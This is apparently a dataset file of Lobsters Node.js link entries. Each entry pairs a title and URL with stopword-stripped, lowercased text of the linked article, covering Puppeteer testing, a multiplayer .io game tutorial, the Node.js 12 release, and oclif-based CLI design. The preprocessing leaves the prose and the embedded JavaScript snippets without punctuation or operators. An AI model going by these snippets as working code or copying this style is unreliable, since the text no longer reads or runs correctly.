took minute fill transaction checked several verify information transcribed correctly conclusion three main takeaway first experiment puppeteer first default using highlevel api eg type select click first resorting injecting j evaluate highlevel api cleaner better simulates real human using website second need smarter waiting thing ready rather adding sleep resorted sleeping quite often past endtoend test code something need minimize going forward third handling website use fancier technique like animation built spa tricky found multiple issue people problem interacting element common explanation site j nt fully run yet regardless see lot potential using puppeteer especially automated test author phantomjs stopped development headless chrome announced another big tool field selenium reliable experience harder set resource heavy optimistic puppeteer prove better option case one concern puppeteer work chrome puppeteer developer appear working experimental support firefox edge also switching chromium fringe browser like opera brave run chromium nontesting purpose taking screenshots automating workflow like brokerscribe browser compatibility nt really matter puppeteer shaping great alternative selenium
115,Lobsters,nodejs,Node.js programming,playball: watch MLB games from the comfort of your own terminal,https://github.com/paaatrick/playball,playball watch mlb game comfort terminal,playball mlb gameday mlbtv quick start install key development,playball watch mlb game comfort terminal mlb gameday mlbtv great sometimes want keep eye game bit discreetly playball put game terminal window quick start want try npx playball install ready big league install package globally npm install g playball run playball key key action q quit j k change highlighted game list scroll list play game enter view highlighted game list l return list game development git clone http githubcompaaatrickplayballgit cd playball npm install npm start contribution welcome
116,Lobsters,nodejs,Node.js programming,Build a Multiplayer (.io) Web Game with Node.js,https://victorzhou.com/blog/build-an-io-game-part-2/,build multiplayer io web game nodejs,make sure read part first example io game http exampleiogamevictorzhoucom part project overview structure build project setup client entrypoints client networking client rendering client input client state table content server entrypoint server game server game object collision detection server entrypoint express discussing webpack webpackdevmiddleware socketio server game managing player simulating game player id update loop return bullet destroyed may return object every tick rate part send game update time call time second nearby server game object shortid base class key preventing code repetition becomes especially important larger project collision detection two circle collide distance center sum radius end build io game github tweet,part build multiplayer io web game series make sure read part first post take look nodejs backend powering example io game mobile work best fullscreen http exampleiogamevictorzhoucom reminder went part series project overview structure high level view project build project setup development tooling configuration setup client entrypoints indexhtml indexjs client networking communicating server client rendering downloading image asset rendering game client input letting user actually play game client state processing game update server table content cover following topic post server entrypoint setting express socketio server game managing serverside game state server game object implementing player bullet collision detection finding bullet hit player server entrypoint using express popular web framework nodejs power web server server entrypoint file srcserverserverjs take care setting const express require express const webpack require webpack const webpackdevmiddleware require webpackdevmiddleware const webpackconfig require webpackdevjs const app express appuse expressstatic public processenvnodeenv development const compiler webpack webpackconfig appuse webpackdevmiddleware compiler else appuse expressstatic dist const port processenvport const server applisten port consolelog server listening port port remember discussing webpack part series put webpack configuration use either use webpackdevmiddleware automatically rebuild development bundle static serve dist folder webpack write file production build primary job serverjs setup socketio server actually attache express server const socketio require socketio const constant require sharedconstants const server applisten port consolelog server listening port port const io socketio server ioon connection socket consolelog player connected socketid socketon constantsmsgtypesjoingame joingame socketon constantsmsgtypesinput handleinput socketon disconnect ondisconnect whenever socketio connection server successfully established setup event handler new socket event handler process message received client delegating singleton game object const game require game const game new game function joingame username gameaddplayer username function handleinput dir gamehandleinput dir function ondisconnect gameremoveplayer io game need one game instance game player play arena see game class work next section server game game class contains important serverside logic two primary job managing player simulating game let start first managing player const constant require sharedconstants const player require player class game constructor thissockets thisplayers thisbullets thislastupdatetime datenow thisshouldsendupdate false setinterval thisupdatebind addplayer socket username thissockets socketid socket const x constantsmapsize mathrandom const constantsmapsize mathrandom thisplayers socketid new player socketid username x removeplayer socket delete thissockets socketid delete thisplayers socketid handleinput socket dir thisplayers socketid thisplayers socketid setdirection dir convention game identify player id field socketio socket refer back serverjs confused socketio take care assigning socket unique id u worry refer player id mind let go instance variable game class socket object map player id socket associated player let u access socket player id constant time player object map player id player object associated player let u quickly access player object player id bullet array bullet object particular order lastupdatetime timestamp last game update occurred see used bit shouldsendupdate helper variable also see used bit addplayer removeplayer handleinput pretty selfexplanatory method used serverjs scroll back review need reminder last line constructor start update loop update second game const constant require sharedconstants const applycollisions require collision class game update const datenow const dt thislastupdatetime thislastupdatetime const bulletstoremove thisbulletsforeach bullet bulletupdate dt bulletstoremovepush bullet thisbullets thisbulletsfilter bullet bulletstoremoveincludes bullet objectkeys thissockets foreach playerid const player thisplayers playerid const newbullet playerupdate dt newbullet thisbulletspush newbullet const destroyedbullets applycollisions objectvalues thisplayers thisbullets destroyedbulletsforeach b thisplayers bparentid thisplayers bparentid ondealtdamage thisbullets thisbulletsfilter bullet destroyedbulletsincludes bullet objectkeys thissockets foreach playerid const socket thissockets playerid const player thisplayers playerid playerhp socketemit constantsmsgtypesgameover thisremoveplayer socket thisshouldsendupdate const leaderboard thisgetleaderboard objectkeys thissockets foreach playerid const socket thissockets playerid const player thisplayers playerid socketemit constantsmsgtypesgameupdate thiscreateupdate player leaderboard thisshouldsendupdate false else thisshouldsendupdate true update method contains arguably important serverside logic let walk order calculate much time dt passed since last update update bullet destroy needed see implementation later need know bulletupdate return true bullet destroyed bound update player create bullet needed also see implementation later playerupdate may return bullet object check collision bullet player using applycollisions return array bullet hit player returned bullet increase score player fired via playerondealtdamage remove bullet bullet array notify remove dead player send game update player every time update called shouldsendupdate helper variable mentioned earlier help u track since update called time second send game update time second thus server tick rate tick second discussed tick rate part send game update every time save bandwidth game update per second plenty call update time second improve quality game simulation time update called precise game simulation want go crazy update call though computationally expensive per second good remainder game class consists helper method used update class game getleaderboard return objectvalues thisplayers sort slice map p username pusername score mathround pscore createupdate player leaderboard const nearbyplayers objectvalues thisplayers filter p p player pdistanceto player constantsmapsize const nearbybullets thisbulletsfilter b bdistanceto player constantsmapsize return datenow playerserializeforupdate others nearbyplayersmap p pserializeforupdate bullet nearbybulletsmap b bserializeforupdate leaderboard getleaderboard pretty simple sort player score take top return username score createupdate used update create game update send player primarily operates invoking serializeforupdate method implemented player bullet class notice also sends data given player nearby player bullet need include info game object far away player server game object game player bullet actually quite similar ephemeral circular moving game object take advantage similarity implementing player bullet start base object class class object constructor id x dir speed thisid id thisx x thisy thisdirection dir thisspeed speed update dt thisx dt thisspeed mathsin thisdirection thisy dt thisspeed mathcos thisdirection distanceto object const dx thisx objectx const dy thisy objecty return mathsqrt dx dx dy dy setdirection dir thisdirection dir serializeforupdate return id thisid x thisx thisy nothing fancy give u good starting point extended let see bullet class us object const shortid require shortid const objectclass require object const constant require sharedconstants class bullet extends objectclass constructor parentid x dir super shortid x dir constantsbulletspeed thisparentid parentid update dt superupdate dt return thisx thisx constantsmapsize thisy thisy constantsmapsize bullet implementation short extension add object using shortid package randomly generate id bullet adding parentid field track player created bullet adding return value update true bullet bound remember talking previous section onwards player const objectclass require object const bullet require bullet const constant require sharedconstants class player extends objectclass constructor id username x super id x mathrandom mathpi constantsplayerspeed thisusername username thishp constantsplayermaxhp thisfirecooldown thisscore update dt superupdate dt thisscore dt constantsscorepersecond thisx mathmax mathmin constantsmapsize thisx thisy mathmax mathmin constantsmapsize thisy thisfirecooldown dt thisfirecooldown thisfirecooldown constantsplayerfirecooldown return new bullet thisid thisx thisy thisdirection return null takebulletdamage thishp constantsbulletdamage ondealtdamage thisscore constantsscorebullethit serializeforupdate return superserializeforupdate direction thisdirection hp thishp player complex bullet class need store couple extra field update method extra thing notably returning newly fired bullet firecooldown left remember talking previous section also extends serializeforupdate method since need include extra field player game update base object class key preventing code repetition example without object class every game object would exact implementation distanceto nightmare keep copypasted implementation sync across different file becomes especially important larger project number class extending object grows collision detection thing left detect bullet hit player recall bit code update method game class const applycollisions require collision class game update const destroyedbullets applycollisions objectvalues thisplayers thisbullets destroyedbulletsforeach b thisplayers bparentid thisplayers bparentid ondealtdamage thisbullets thisbulletsfilter bullet destroyedbulletsincludes bullet need implement applycollisions method return bullet hit player luckily hard collidable object circle easiest shape implement collision detection already distanceto method implement object class previous section collision detection implementation look like const constant require sharedconstants function applycollisions player bullet const destroyedbullets let bulletslength let j j playerslength j const bullet bullet const player player j bulletparentid playerid playerdistanceto bullet constantsplayerradius constantsbulletradius destroyedbulletspush bullet playertakebulletdamage break return destroyedbullets math behind simple collision detection fact two circle collide distance center sum radius case distance two circle center exactly sum radius couple thing careful making sure bullet hit player created achieve checking bulletparentid playerid making sure bullet hit edge case collides multiple player time take care break statement player collides bullet found stop looking go next bullet end gone everything need know build io web game build io game code example io game opensource github question concern leave comment tweet happy hacking
117,Lobsters,nodejs,Node.js programming,How to Build a Multiplayer (.io) Web Game,https://victorzhou.com/blog/build-an-io-game-part-1/,build multiplayer io web game,agario io game built sold io game slitherio diepio understand build io game scratch promise example io game example io game play right page http exampleiogamevictorzhoucom table content project overview structure build project setup client entrypoints client networking client rendering client input client state part project overview structure downloading source code build project setup webpack j bundle babel babelpresetenv cs bundle filename substitution optimize caching bundle change filename change local setup node npm client entrypoints github canvas client networking socketio websockets client rendering canvas srcclientrenderjs client input event listener client state state client rendering point time others bullet leaderboard naive client state limit render frame rate server tick rate frame rate tick rate often lower frame rate prone lag client freeze better client state render delay input lag clientside prediction linear interpolation linearly interpolate implementing better client state never know current time server pretend first update arrived instantly local never assume timestamps consistent across machine server timestamp current render time base update first update find going backwards current server time interpolate github conclusion part tweet exampleiogame github repo,agario came inspired new io game genre since exploded popularity experienced rise io game firsthand built sold io game past year case never heard io game free multiplayer web game easy join account required usually pit many player one arena famous io game include slitherio diepio post going understand build io game scratch need working knowledge javascript comfortable thing like syntax keyword promise even familiar javascript still able get post example io game help u learn going referencing example io game embedded go ahead try play right page mobile work best fullscreen http exampleiogamevictorzhoucom pretty simple game control ship arena player ship automatically fire bullet trying hit player bullet avoiding table content part twopart series cover post project overview structure high level view project build project setup development tooling configuration setup client entrypoints indexhtml indexjs client networking communicating server client rendering downloading image asset rendering game client input letting user actually play game client state processing game update server go server part project overview structure recommend downloading source code example game follow along example game us project directory structure look like public asset src client cs html indexhtml indexjs server serverjs shared constantsjs public anything public folder statically served server publicassets contains image used project src source code src folder client server pretty self explanatory shared contains constant file imported client server build project setup mentioned using webpack module bundler build project let take look webpack configuration const path require path const minicssextractplugin require minicssextractplugin moduleexports entry game srcclientindexjs output filename name contenthash j path pathresolve dirname dist module rule test j exclude nodemodules use loader babelloader option presets babelpresetenv test cs use loader minicssextractpluginloader cssloader plugins new minicssextractplugin filename name contenthash cs new htmlwebpackplugin filename indexhtml template srcclienthtmlindexhtml key line highlighted srcclientindexjs javascript j client entrypoint webpack start recursively look file imported j output webpack build placed dist directory refer file j bundle using babel specifically babelpresetenv config transpile j code older browser using plugin extract cs referenced j file bundle together refer cs bundle may noticed strange name contenthash ext bundle filename include webpack filename substitution name replaced entrypoint name game contenthash replaced hash file content optimize caching tell browser cache j bundle forever bundle change filename change contenthash change final result filename like webpackcommonjs file base config file import development production configuration example development config const merge require webpackmerge const common require webpackcommonjs moduleexports merge common mode development use webpackdevjs efficiency developing switch webpackprodjs optimize bundle size deploying production local setup recommend installing project local machine follow along rest post setup simple first make sure node npm installed git clone http cd exampleiogame npm install ready go run development server simply visit web browser dev server automatically rebuild j cs bundle edit code refresh see change client entrypoints let get actual game code start need indexhtml page first thing browser load visit site pretty simple doctype html html head title example io game title link type textcss rel stylesheet href gamebundlecss head body canvas id gamecanvas canvas script async src gamebundlejs script div id playmenu class hidden input type text id usernameinput placeholder username button id playbutton play button div body html code sample slightly abridged clarity many code sample post always see full code github canvas canvas element use render game link include cs bundle script include javascript bundle main menu username input play button homepage loaded browser javascript code start executing beginning j entrypoint file srcclientindexjs import connect play networking import startrendering stoprendering render import startcapturinginput stopcapturinginput input import downloadassets asset import initstate state import setleaderboardhidden leaderboard import cssmaincss const playmenu documentgetelementbyid playmenu const playbutton documentgetelementbyid playbutton const usernameinput documentgetelementbyid usernameinput promiseall connect downloadassets playmenuclasslistremove hidden usernameinputfocus playbuttononclick play usernameinputvalue playmenuclasslistadd hidden initstate startcapturinginput startrendering setleaderboardhidden false might seem complicated actually much going import bunch j file import cs webpack know include cs bundle run connect establish connection server run downloadassets download image need render game step finished display main menu playmenu setup click handler play button clicked initialize game tell server ready play meat clientside logic resides file imported indexjs go next client networking game use wellknown socketio library communicate server socketio includes builtin support websockets great twoway communication send message server server send message u connection one file srcclientnetworkingjs take care communication server import io socketioclient import processgameupdate state const constant require sharedconstants const socket io w windowlocationhost const connectedpromise new promise resolve socketon connect consolelog connected server resolve export const connect ongameover connectedpromisethen socketon constantsmsgtypesgameupdate processgameupdate socketon constantsmsgtypesgameover ongameover export const play username socketemit constantsmsgtypesjoingame username export const updatedirection dir socketemit constantsmsgtypesinput dir code slightly abridged clarity major thing happen file try connect server connectedpromise resolve established connection connection succeeds register callback processgameupdate ongameover message might receive server export play updatedirection file use client rendering time make stuff show screen must download image asset need let write asset manager const assetnames shipsvg bulletsvg const asset const downloadpromise promiseall assetnamesmap downloadasset function downloadasset assetname return new promise resolve const asset new image assetonload consolelog downloaded assetname asset assetname asset resolve assetsrc asset assetname export const downloadassets downloadpromise export const getasset assetname asset assetname managing asset hard implement main idea keep asset object map filename key image object value asset finished downloading save asset object easy retrieval later finally individual asset download resolved meaning asset downloaded resolve downloadpromise downloading asset way move rendering mentioned earlier using canvas canvas draw webpage game pretty simple need draw background player ship player game bullet important part srcclientrenderjs draw exactly thing listed import getasset asset import getcurrentstate state const constant require sharedconstants const playerradius playermaxhp bulletradius mapsize constant const canvas documentgetelementbyid gamecanvas const context canvasgetcontext canvaswidth windowinnerwidth canvasheight windowinnerheight function render const others bullet getcurrentstate return renderbackground mex mey bulletsforeach renderbulletbind null renderplayer othersforeach renderplayerbind null let renderinterval null export function startrendering renderinterval setinterval render export function stoprendering clearinterval renderinterval code also slightly edited clarity render primary function file startrendering stoprendering control activation fps render loop specific implementation individual render helper function eg renderbullet important one simple example function renderbullet bullet const x bullet contextdrawimage getasset bulletsvg canvaswidth x mex bulletradius canvasheight mey bulletradius bulletradius bulletradius notice using getasset method saw earlier assetjs read rest srcclientrenderjs interested seeing render helper function client input time make game playable control scheme simple use mouse desktop touch screen mobile control direction movement register event listener mouse touch event srcclientinputjs take care import updatedirection networking function onmouseinput e handleinput eclientx eclienty function ontouchinput e const touch etouches handleinput touchclientx touchclienty function handleinput x const dir x windowinnerwidth windowinnerheight updatedirection dir export function startcapturinginput windowaddeventlistener mousemove onmouseinput windowaddeventlistener touchmove ontouchinput export function stopcapturinginput windowremoveeventlistener mousemove onmouseinput windowremoveeventlistener touchmove ontouchinput onmouseinput ontouchinput event listener call updatedirection networkingjs input event happens eg mouse move updatedirection take care messaging server handle input event update game state accordingly client state section advanced one post discouraged understand everything first readthrough feel free skip section come back later last piece puzzle need complete clientside code state remember bit code client rendering section import getcurrentstate state function render const others bullet getcurrentstate getcurrentstate must able give u client current game state point time based game update received server example game update server might send x direction id hp others bullet id x id x leaderboard username player score game update field server timestamp update created player info player receiving update others array player info player game bullet array bullet info bullet game leaderboard current leaderboard data ignoring post naive client state naive implementation getcurrentstate could directly return data recently received game update let lastgameupdate null export function processgameupdate update lastgameupdate update export function getcurrentstate return lastgameupdate nice clean easy one reason implementation problematic limit render frame rate server tick rate frame rate number frame ie render call per second fps game generally target least fps tick rate rate server sends game update client often lower frame rate game server operates tick per second render recent game update effective fps exceed never receive update per second server even call render time per second half call would redraw exact thing effectively nothing another problem naive implementation prone lag perfect internet condition client would receive game update exactly every m per second ideal game update sadly nothing ever perfect realistic representation might look like nonideal game update naive implementation pretty much worst case scenario come lag game update arrives m late client freeze extra m still rendering game state previous update imagine bad experience player game would jittery feel unstable randomly freeze better client state make simple improvement naive implementation first use render delay m meaning current client state always m behind server game state example server time state rendered client server state time give u m buffer tolerate unpredictable game update arrival cost constant m input lag small price pay consistent smooth gameplay majority player especially casual player even notice delay much easier human adjust constant m lag try play unpredictable lag different technique use called clientside prediction good reducing perceived lag outside scope post improvement make use linear interpolation render delay usually already least update ahead current client time whenever getcurrentstate called linearly interpolate game update immediately current client time solves frame rate problem render unique frame often want implementing better client state example implementation srcclientstatejs us render delay linear interpolation little long let break part first const renderdelay const gameupdates let gamestart let firstservertimestamp export function initstate gamestart firstservertimestamp export function processgameupdate update firstservertimestamp firstservertimestamp updatet gamestart datenow gameupdatespush update const base getbaseupdate base gameupdatessplice base function currentservertime return firstservertimestamp datenow gamestart renderdelay function getbaseupdate const servertime currentservertime let gameupdateslength gameupdates servertime return return first thing understand currentservertime saw every game update includes server timestamp want use render delay render m behind server never know current time server know long took given update arrive internet unpredictable vary widely get around issue use reasonable approximation pretend first update arrived instantly true know server time exact instant store server timestamp firstservertimestamp store local client timestamp instant gamestart woah wait second time server time client distinction server timestamp client timestamp great question reader turn datenow return different timestamps client server based factor local machine never assume timestamps consistent across machine clear currentservertime return server timestamp current render time word current server time firstservertimestamp datenow gamestart minus render delay renderdelay next let understand handling game update processgameupdate called whenever update received server store new update gameupdates array keep memory use check remove old update base update since need anymore exactly base update first update find going backwards current server time remember drawing game update immediately left client render time base update base update used throw away update base update let finally look implementation getcurrentstate find export function getcurrentstate firstservertimestamp return const base getbaseupdate const servertime currentservertime base return gameupdates gameupdateslength else base gameupdateslength return gameupdates base else const baseupdate gameupdates base const next gameupdates base const r servertime baseupdatet nextt baseupdatet return interpolateobject baseupdateme nextme r others interpolateobjectarray baseupdateothers nextothers r bullet interpolateobjectarray baseupdatebullets nextbullets r case handle base meaning update current render time see implementation getbaseupdate happen right start game due render delay case use recent update base recent update happen lag poor internet connectivity case also use recent update update current render time interpolate left statejs implementation linear interpolation simple boring math want see look statejs github conclusion made entire game client io game distilled essential part series switch backend talk build io game server question leave comment tweet found bug spot problem code submit issue pr exampleiogame github repo thanks reading
118,Lobsters,nodejs,Node.js programming,Introducing Node.js 12,https://medium.com/@nodejs/introducing-node-js-12-76c41a1b3f3f,introducing nodejs,lts strategy get upgrade update official blog hello tl http http properly configure default heap limit switch default http parser llhttp llhttp experimental llhttp making native module easier progress continues http worker thread http nodejsorgapiworkerthreadshtml http mediumcom diagnostic report http heap dump http http startup improvement code cache roughly speedup generate code cache builtin library advance build time module support great blog post new compiler platform minimum buildingmd thank nodejs build working group bethany griggs guideline,blog written bethany griggs michael dawson additional contribution nodejs release team technical steering committeewe excited announce nodejs today highlighted update feature include faster startup better default heap limit update tl llhttp new feature including diagnostic report bundled heap dump capability update worker thread napi module support nodejs release replaces version current release line nodejs release line become nodejs long term support lts release oct detail lts strategy get upgrade update always new version javascript engine brings performance tweak improvement well keeping nodejs ongoing improvement language runtime highlight include read official bloghello tl introducing support making default max protocol also supporting clinodeoptions switch disable major update tl protocol many security enhancement used whenever different enough even though openssl apis technically apiabi compatible negotiated change timing protocol record callback broke assumption hardcoded tl module change introduces api incompatibility negotiated intention backported current lts release line default maximum tl protocol reset allow user line explicitly enable want want read check related article http http configure default heap limitsthis update configure javascript heap size based available memory instead using default set use browser previous release unless configured defaulted limiting max heap size mb platform respectively configuring heap size based available memory ensures nodejs try use memory available terminating memory exhaustedthis particularly useful processing large datasets still possible set maxoldspacesize use different limit default appropriate applicationswitch default http parser llhttpnodejs also switch default parser llhttp beneficial make testing comparing new llhttpbased implementation easier first introduced llhttp experimental llhttp taken experimental releasemaking native module easier progress continuesnodejs continues trend making building supporting native module easier change include better support native module combination worker thread well napi http nodejsorgapinapihtml napinapi version also backported make easier use thread native asynchronous function read leverage module great article http threadsworker thread http nodejsorgapiworkerthreadshtml new release still seeing progress use worker thread longer requires use flag progressing well towards moving experimental nodejs already performs well singlethreaded event loop usecases additional thread leveraged better result like try let u know use case helpful quick introduction check great article http mediumcom reportsnodejs brings new experimental feature diagnostic report allows generate report demand certain event occur report contains information useful help diagnose problem production including crash slow performance memory leak high cpu usage unexpected error read great article http dumpsif ever needed generate heap dump order investigate memory issue slowed install new module production good news nodejs brings integrated heap dump capability box check documentation http http learn morestartup improvementsin nodejs shipped builtin code cache support worker loading builtin library written javascript library previously compiled main thread worker thread longer need compile scratch reuse code cache generated main thread speed compilation similarly main thread reuse cache generated worker gave roughly speedup startup workersnow nodejs generate code cache builtin library advance build time embed binary final release main thread use code cache start initial load builtin library written javascript give speedup startup time main module supportnodejs brings updated experimental version support module important step toward supported implementation like try give u feedback detail check great blog postnew compiler platform minimumsnodejs continue embrace newer c feature take advantage newer compiler optimization security enhancement release nodejs codebase requires minimum gcc glibc platform macos window binary released nodejs org use new toolchain minimum therefore include new compiletime performance security enhancementsthe increment minimum compiler libc requirement also increment minimum supported platform platform using glibc platform macos window must include minimum version common linux platform compatible version include enterprise linux rhel centos debian ubuntu binary available nodejsorg compatible system user needing compile binary system natively supporting gcc may need use custom toolchain even though nodejs may compile older compiler expect nodejs codebase including rapidly adopt c feature supported gcc prelts timeframewindows minimum remain nodejs requiring least window minimum compiler visual studio macos user needing compile nodejs require minimum xcode nodejs binary made available nodejsorg support minimum macos yosemite detail available nodejs buildingmdthank big thank everyone made release come together whether submitted pull request helped benchmarking effort charge one release version also like thank nodejs build working group ensuring infrastructure create test release release manager nodejs bethany griggs full list release team member head read complete list feature hereif interested contributing nodejs welcome learn via contributor guideline
119,Lobsters,nodejs,Node.js programming,Sherlock Holmes and the Mystery of Trash in node_modules,https://talbrenev.com/2019/04/16/sherlock-holmes.html,sherlock holmes mystery trash nodemodules,sherlock holmes mystery trash nodemodules tal brenev share,sherlock holmes mystery trash nodemodules tal brenev april grepping project utmost surprise line output leapt came chromatic scale diminished seventh heard scale diminished seventh thought would terminology appear place put detective hat set find source mysterious text fortunately solving mystery require deduction whatsoever since culprit right output grep promptly took detective hat proceeded take closer look offending file hidden away nodemodules directory glory afiletxt line word megabyte top file project gutenberg ebook adventure sherlock holmes sir arthur conan doyle series sir arthur conan doyle something odd however read adventure sherlock holmes definitely feel like word long recall chromatic scale ever mentioned either upon inspection realised behemoth consist exclusively mystery novel also appears contain considerable chunk war peace world file npm module might ask elementary dear reader somewhere inside gargantuan dependency tree project module called readline name suggests module read file line line since test module read file without file afiletxt added test fixture reason even sherlock holmes would able deduce test distributed npm alongside actual package module guilty crime heinous anything sir conan doyle could ever come committed firstdegree bloat also wasted unfathomable amount electricity installation make liable charge assaulting battery case closed take away lestrade share
120,Lobsters,nodejs,Node.js programming,"For building a CLI, Node is pretty awesome",https://dev.to/nickparsons/crafting-a-command-line-experience-that-developers-love-4451,building cli node pretty awesome,zeit heroku stream cli option commander corporal oclif oclif multicommand support v singlecommand support single multi github auto parsing minimist configuration support fsextra package auto documenting codebase readme oclifdevcli single script interactive raw argument support enquirer inquirer make pretty chalk use table large response clitable package printing json parsing bash jq jq publishing oclifdevcli oclifdevcli oclifdevcli key takeaway zeit heroku util file stream fsextra oclif minimist enquirer chalk clitable os interactive tutorial,setting build highly usable developer tool go without saying proper cli interface api paramount zeit heroku setting tone type developer tool extensive research best practice come command line experience started quest digging finding since stream cli currently public beta method philosophy found research well unearthed fresh mind wanted take minute outline found best practice among cli tool developer need come building proper cli step step explanation would go building another cli explanation chose thing way option good number opensource project arisen help facilitate scaffolding overall development cli aside backend infrastructure stream written primarily go use javascript many tool flexibility front backend project large number opensource contribution overall global presence ease use aforementioned reason make obvious choice creating powerful tool low barrier entry likewise setting adventure build cli dozen opensource project built javascript available help get started fair started looking building cli commander corporal hitting top google npm nearly every search wanted something robust battletested project provided everything needed one go rather package simply parsed argument passed along command found oclif oclif oclif javascriptbased cli framework opensourced team behind heroku come packed prebuilt functionality even offer extendability use plugins glance major feature stuck looking oclif multicommand support autoparsing command argument andor flag configuration support auto documenting codebase ultimately availability feature also primary reason chose move forward using oclif base cli tool stream remember builtin feature oclif ship box comprehensive list option recommend taking look official oclif doc multicommand support v singlecommand support important note single endpoint method calling singlecommand eg grep support need developing larger cli tool one created stream likely need optin multicommand support eg npm git quick breakdown difference single stream apikeyfoo apisecretbar namebaz emailqux multi stream config set apikeyfoo apisecretbar namebaz emailqux may look similar one key difference two option single command allow subcommands scoping like call simply mean complicated nested command made possible single command support type command take argument regardless configuration without argument cli one advantage multicommand support delimits call colon eg allowing keep thing organized better yet organize directory structure using nested directory shown src code github sometimes bit difficult conceptualize beginning however get hand dirty creating cli first time come together make sense auto parsing hood oclif handle parsing command line argument passed generally nodejs pull argument array provided processargv although particularly difficult definitely especially toss requirement validation casting stringsbooleans planning using oclif handle parsing need move forward simple setup would recommend minimist package dedicated argument parsing command line configuration support serverside integration whether api sdk hopefully likely provide token sort security identity reason integration needed persist configuration credential user eg api key secret name email secure location user computer without persisting type data would make sure every api call stream included proper credential let face nobody want pas argument every command get around issue leverage oclif builtin support managing configuration file storing user credential configjs file within config directory machine typically config directory resides configstreamcli unix machine localappdata streamcli window machine help oclif worry detecting user machine type take care distinction hood making easy get within class command using thisconfigconfigdir knowing able create small utility collect store necessary credential using fsextra package look code doc configuration option within oclif found auto documenting codebase happy surprised find oclif support autodocumenting command without sort functionality would manually change readme underlying doc every time made change addingremoving command argument changing command name modifying directory structure within command subdirectory probably imagine difficult would maintain within large cli project like stream cli help oclifdevcli package able add single script packagejson file run build process command scan directory structure magically generates doc shown interactive raw argument support sometimes calling command via cli tool one last thing may taking space brain required argument command especially large number always use help flag print required argument sometimes best provide interactive prompt asks user various information missing provided flag example rather calling stream config set apikeyfoo apisecretbar namebaz emailqux user call zero argument passed prompted several option prompting user found enquirer easiest package work although package similar functionality inquirer enquirer api tends bit forgiving easier work important try apply prompt style functionality multiargument command possible however make sure check flag ensure prompting user information already passed example flagsname flagsemail flagskey flagssecret const re await prompt type input name name message full name required true type input name email message email address associated stream required true type input name key message stream api key required true type password name secret message stream api secret required true const key re reshasownproperty key flag key re key note check flag display prompt flag exist make pretty command line generally thought bland green white text black background news flash actually anything stopping making cli stand fact developer love color introduced command line color help differentiate error v success message eventstimestamps want make thing pretty chalk great best package use provides extensive api adding color cli little overhead integrate chalk cli import chalk chalk wrap string chalk method color optional styling bold italic etc add flair output thislog response chalkbluebolditalic bold blue italicized use table large response let face developer want comb large response returned api case important always return something meaningful easytoread one favorite way accomplish providing user easily digestible output use table example chose clitable package help display data table provides easytouse flexible api support following vertical horizontal display textbackground color support text alignment left center right padding custom column width support auto truncation based predefined width printing json parsing bash jq beauty providing cli called either user script part creating highly approachable usable tool defaulting communication immediately make sense user said scripting allows handsoff approach especially helpful user would like run set command rather firing oneoff command stream cli default returning userfriendly humanreadable output see make pretty use table large response understand running script likely want verbose response instead humanreadable message access raw response data added json flag allows user specify raw payload json response output quick example showing fetch credential user stream cli piping output directly jq lightweight flexible commandline json processor binbash run stream config get json name jq rawoutput name run email jq rawoutput email run apikey jq rawoutput apikey run apisecret jq rawoutput apisecret run echo name echo email echo apikey echo apisecret found providing functionality especially useful stream chat user want set chat infrastructure provision user permission etc one go without using underlying rest api publishing publishing cli may seem daunting however different publishing package npm basic step follows update oclifmanifestjson file using tool provided oclifdevcli package file scan directory update manifest file updated version cli along command available user manifest file updated calling rm f oclifmanifestjson oclifdev manifest command line update doc reflect change made command also tool provided oclifdevcli package run using oclifdev readme multi single running singlecommand cli bump npm version using version command eg npm version prerelease full doc npm version command found publish release npm npm publish command user install cli globally npm yarn npm g install yourclipackage yarn global add yourclipackage need distribute cli tarball recommend looking oclifdev pack command provided oclifdevcli package command allow deploy package homebrew osspecific package manager simply run independently system key takeaway like dig full source code behind stream cli find opensource github repo key takeaway post exhaustive list suggestion best practice hope walk away post additional knowledge apply cli summarize main takeaway endeavor inspiration look functionality zeit heroku provide within cli make awesome developer command line experience apicli requires data persistence store data cache directory specific cli load using util file stream also note fsextra package come handy type thing even though support built oclif oclif way go especially building large cli opposed singlecommand cli building singlecommand cli still use oclif make sure specify singlecommand api scaffolding cli want use framework okay package minimist provides argument parsing command line easily used within project use prompt enquirer another package choosing user walked requirement command asked data command need order execute properly note never required eg let user bypass prompt pas correct argument use color possible make cli little easier eye chalk serf great tool response data well enough structured print user unless specify instead drop table using clitable always allow user specify output type eg json default message humanreadable keep fast timeconsuming task file uploads command require multiple api call recommend showing loading indicator let user know work done background looking package npm recommend checking os always love hear thought opinion well please feel free drop comment interested building chat product top stream platform recommend running interactive tutorial full doc stream chat api view view
121,Lobsters,nodejs,Node.js programming,Tools for writing cross-platform Node.js,https://github.com/bcoe/awesome-cross-platform-nodejs,tool writing crossplatform nodejs,content resource application development environment continuous integration appveyor travis azure pipeline virtualization ievms virtualbox docker compatibility wine cygwin wsl mingw msys git bash database redis library o identification iswindows iswsl getos osname systeminformation shell execa gulpexeca crossspawn shelljs nodewindows logsymbols figure clipboardy clipboardcli environment crossenv userhome username osenv iselevated filesystem rimraf del makedir readdirp cpy chokidar gracefulfs fsextra anypath devnullcli signal fkill signalexit process stream desktop ui open nodenotifier window registry known issue cmdexe unicode woe spawn issue exec behavior shell see also support submit issue github code conduct contributing guideline allcontributors license,curated list awesome developer tool writing crossplatform nodejs code content resource application development environment continuous integration appveyor focused window free tier available os project travis windowsmacoslinux free os project azure pipeline windowsmacoslinux free os project parallel job virtualization ievms automated installer free virtual machine image microsoft provides testing multiple version ie image useful crossplatform testing various technology however make sure read understand microsofts licensing virtualbox general purpose software running virtual machine docker software platform create deploy manage virtualized application container common operating system ecosystem allied tool compatibility wine run window api call linux mac bsd solaris cygwin run posix window wsl run linux command line window elf binary execution system call filesystem bash core utility common application mingw gcc window msys git bash bash window database redis native port redis window library o identification iswindows detect whether current platform window iswsl detect whether current platform wsl window subsystem linux getos retrieve current o including linux distribution osname get name current operating system systeminformation hardwaresoftware system information shell execa crossplatform implementation childprocess execfile exec gulpexeca crossplatform command execution gulpjs crossspawn crossplatform implementation childprocessspawn shelljs crossplatform unix shell command nodewindows window support nodejs script daemon eventlog uac etc logsymbols colored symbol various log level window fallback figure unicode symbol window fallback clipboardy clipboardcli crossplatform copypaste environment crossenv set environment variable crossplatform userhome get path user home directory crossplatform username get current username osenv crossplatform environment variable iselevated check process running elevated privilege crossplatform implementation unix filesystem rimraf del delete file folder crossplatform makedir crossplatform mkdir p readdirp recursive version fsreaddir cpy copy file crossplatform chokidar improved crossplatform file watching gracefulfs improves f module especially window fsextra combine gracefulfs better json file reading promise 